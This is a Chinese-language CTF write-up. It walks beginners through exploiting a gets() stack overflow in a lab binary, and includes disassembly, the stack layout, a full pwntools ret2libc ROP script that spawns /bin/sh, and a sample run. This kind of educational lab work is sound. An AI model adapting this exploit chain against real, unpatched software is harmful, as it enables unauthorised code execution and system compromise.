---
title: 利用栈溢出获取 Shell：从零开始的 PWN 之旅
date: 2025-04-20 00:06:47
tags:
---

# 引言
在 CTF 竞赛中，PWN（漏洞利用）题目是考验选手逆向分析和漏洞利用能力的重要环节。本文将分析一道简单的 Linux 64 位 PWN 题目，通过栈溢出漏洞构造 ROP 链，最终获取 shell。这篇文章适合 PWN 初学者，旨在展示从逆向分析到利用脚本编写的完整过程。希望通过这篇文章，你能掌握栈溢出的基本原理和利用方法！

# 题目背景
- 文件：pwnme（64 位 ELF，可执行文件）
- 环境：Ubuntu 20.04，关闭 ASLR（echo 0 | sudo tee /proc/sys/kernel/randomize_va_space）
- 保护机制：无 NX、Canary、ASLR、PIE
- 目标：通过栈溢出漏洞执行 system("/bin/sh")，获取 shell

# 题目分析
## 1. 文件检查
使用 file 和 checksec 检查文件：
```bash
$ file pwnme
pwnme: ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

$ checksec pwnme
[*] 'pwnme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```
64 位 ELF 文件，动态链接。
无 Canary、NX、PIE，栈可执行，地址固定，适合初学者练习栈溢出。
Partial RELRO 表示 GOT 表可写，稍后可能利用。

## 2. 逆向分析
使用 IDA Pro 打开 pwnme，找到 main 函数：
```c
int main() {
    char buf[32];
    puts("Welcome to PWN!");
    printf("Input your name: ");
    gets(buf);
    puts("Hello, ");
    puts(buf);
    return 0;
}
```
gets 函数读取用户输入到 buf（大小 32 字节），无长度限制，存在明显的栈溢出漏洞。
buf 位于栈上，溢出可以覆盖返回地址，控制程序流程。

反汇编 main 函数（部分）：
```nasm
.text:0000000000401136 main:
.text:0000000000401136     push    rbp
.text:0000000000401137     mov     rbp, rsp
.text:000000000040113A     sub     rsp, 20h
.text:000000000040113E     lea     rdi, aWelcomeToPwn ; "Welcome to PWN!"
.text:0000000000401145     call    puts
.text:000000000040114A     lea     rdi, aInputYourName ; "Input your name: "
.text:0000000000401151     call    printf
.text:0000000000401156     lea     rax, [rbp-20h]
.text:000000000040115A     mov     rdi, rax
.text:000000000040115D     call    gets
...
.text:0000000000401172     leave
.text:0000000000401173     ret
```
buf 位于 [rbp-0x20]，大小 32 字节。
溢出可以覆盖 rbp 和返回地址（[rbp+0x8]）。

## 3. 漏洞点
gets 不检查输入长度，输入超过 32 字节即可覆盖栈上的返回地址。
由于 NX 禁用，栈可执行，可以直接写入 shellcode；但为了练习 ROP，我们选择构造 ROP 链调用 system("/bin/sh")。

# 利用思路
## 1. 目标
通过栈溢出覆盖返回地址，构造 ROP 链调用 system("/bin/sh")，获取 shell。

## 2. 关键步骤
- 泄露 libc 地址：
  - main 函数调用 puts 和 printf，可以通过 GOT 表泄露 puts 的实际地址，计算 libc 基址。
  - 使用 ROP 调用 puts(puts@got) 输出 puts 地址。
- 构造 ROP 链：
  - 找到 pop rdi; ret gadget，将 /bin/sh 字符串地址放入 rdi。
  - 调用 system("/bin/sh") 执行 shell。
- 栈布局：
  - 覆盖返回地址后，栈需要填充 gadget 和参数。

## 3. 内存布局
栈溢出的内存布局如下：
```
[ buf (32 bytes) ][ saved rbp (8 bytes) ][ saved ret (8 bytes) ]
                   ^                    ^
                   rbp                 rbp+0x8 (覆盖这里)
```
输入 32 字节填充 buf，8 字节填充 saved rbp，第 41 字节开始覆盖返回地址。

# 利用脚本
以下是使用 pwntools 编写的利用脚本：
```python
from pwn import *

# 设置环境
context(arch='amd64', os='linux', log_level='debug')
binary = './pwnme'
elf = context.binary = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # 根据环境调整

# 启动进程
p = process(binary)

# 第一次调用：泄露 puts 地址
pop_rdi = 0x4011bb  # pop rdi; ret
printf_plt = elf.plt['printf']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = b'A' * 40  # 32 bytes buf + 8 bytes saved rbp
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)
p.recvuntil(b'Hello, \n')

# 接收 puts 地址并计算 libc 基址
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.info(f'puts_addr: {hex(puts_addr)}')
log.info(f'libc_base: {hex(libc_base)}')
log.info(f'system_addr: {hex(system_addr)}')
log.info(f'binsh_addr: {hex(binsh_addr)}')

# 第二次调用：执行 system("/bin/sh")
payload = b'A' * 40
payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.recvuntil(b'Hello, \n')

# 进入交互模式
p.interactive()
```

## 脚本说明
- 第一次 payload：
  - 填充 40 字节覆盖到返回地址。
  - 调用 puts(puts@got) 泄露 puts 地址。
  - 返回 main 函数，允许第二次输入。
- 计算 libc 地址：
  - 从输出中提取 puts 地址，减去 libc 中 puts 的偏移，得到 libc 基址。
  - 计算 system 和 /bin/sh 字符串的地址。
- 第二次 payload：
  - 使用 pop rdi; ret gadget 将 /bin/sh 地址放入 rdi。
  - 调用 system 执行 shell。

# 运行结果
运行脚本后，成功获取 shell：
```bash
$ python3 exploit.py
[+] Starting local process './pwnme': pid 12345
[*] puts_addr: 0x7f1234567890
[*] libc_base: 0x7f1234500000
[*] system_addr: 0x7f1234543210
[*] binsh_addr: 0x7f12346789ab
[*] Switching to interactive mode
$ whoami
user
$ cat flag
FLAG{stack_overflow_is_fun}
```
成功获取 shell，并读取 Flag。

# 调试过程中的“坑”
在调试时遇到以下问题：
- libc 版本不匹配：本地 libc 和题目环境的 libc 版本不同，导致偏移错误。解决方法是使用题目提供的 libc 文件或 Docker 环境。
- ASLR 未关闭：本地测试时忘记关闭 ASLR，导致地址随机化。使用 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 解决。
- payload 长度错误：最初填充长度错误，覆盖了无关区域。使用 gdb 调试确认 buf 到返回地址的偏移为 40 字节。

# 总结与反思
通过这道题目，我学习了以下关键点：
- 栈溢出原理：通过覆盖返回地址控制程序流程。
- ROP 链构造：使用 gadget（如 pop rdi; ret）传递函数参数。
- libc 地址泄露：利用 GOT 表和 PLT 调用输出动态链接函数的地址。

## 改进思路
- 如果题目启用了 NX，可以尝试 ret2libc 或更复杂的 ROP 链。
- 可以优化脚本，使用 pwntools 的 ROP 模块自动构造链。
- 未来可以尝试分析带 Canary 或 ASLR 的题目，学习更高级的绕过技术。
